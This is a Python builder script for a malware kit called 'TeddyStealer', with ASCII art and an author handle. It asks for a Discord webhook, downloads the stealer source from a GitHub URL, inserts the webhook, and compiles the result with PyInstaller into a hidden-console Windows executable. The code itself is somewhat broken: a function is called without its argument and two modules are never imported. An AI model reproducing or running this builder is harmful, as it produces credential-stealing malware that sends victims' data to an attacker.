import os
import shutil
import requests
import PyInstaller.__main__

def endHandler():
  os._exit(0)

def checkhook(hook):
    if not "api/webhooks" in hook:
        print(f"\n{Fore.RED}Invalid Webhook.{Fore.RESET}")
        time.sleep(1)
        endHandler()

print('''
           .-""-.                    _
          /  _   \              _   /|)
        .'---""-.|             /|) /|/
      .'          `.          /|/ /|/
   __/_             \    .   /|/ /|/
 .'    `-.          .8-. \\-/|/ /|/
J   .--.  Y     .o./ .o8\ |/\ `/_.-.
|  (    \       98P  888| /\ / ( ` |
|  `-._/          |   `"|/\ / \|\  F
 `.     .            "-'|\ / \/\  J
   |---'              _/\ / \// ` |
   J                 /// /   /   F
   _\    .'`-._    ./// /   /\\.'
  /  `. / .-'  `<-'/// /  _/\ \\
  F.--.\||       `.`/ /.-' )|\ \`.
  \__.-/)'         `.-'   ')/\\  /
 .-' .'/  \               ')  `-'
(  .'.'   '`.            .'
 \'.'    '   `.       .-'
  /     '      `.__.-'/|
 J     :          `._/ |
 |     :               |
 J     ;-"""-.         F
  \   /       \       /
   `.J         L   _.'
     F         |--' |
     J         |    |__
      L        |       `.
      |        |-.      \|
      |           \   )_.'
      |        -.\ )-'
      \         )_)
       `"""""""'
Made By Shade#3421
''')
webhookk = input(f"Input Webhook: ")
checkhook()

fileName = input(f"Input File Name: ")

code = requests.get("https://raw.githubusercontent.com/Shade3421/TeddyStealer/main/TeddyStealer.py").text.replace("WEBHOOK", webhookk)
with open(f"{fileName}.py", 'w') as f:
    f.write(code)

print(f"\nCreating {fileName}.exe\n")
os.system(f'title Creating {fileName}.exe')
    #the equivalent to "pyinstaller {fileName}.py -n {fileName} --onefile --noconsole --log-level=INFO -i NONE"
PyInstaller.__main__.run([
        '%s.py' % fileName,
        '--name=%s' % fileName,
        '--onefile',
        '--noconsole',
        '--log-level=INFO',
        '--icon=NONE',
    ])
try:
        #clean build files
        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
        shutil.rmtree('build')
        shutil.rmtree('dist')
        shutil.rmtree('__pycache__')
        os.remove(f'{fileName}.spec')
except FileNotFoundError:
        pass

print(f"\nFile created as {fileName}.exe\n")
input(f'Enter anything to continue . . .  ')
endHandler()
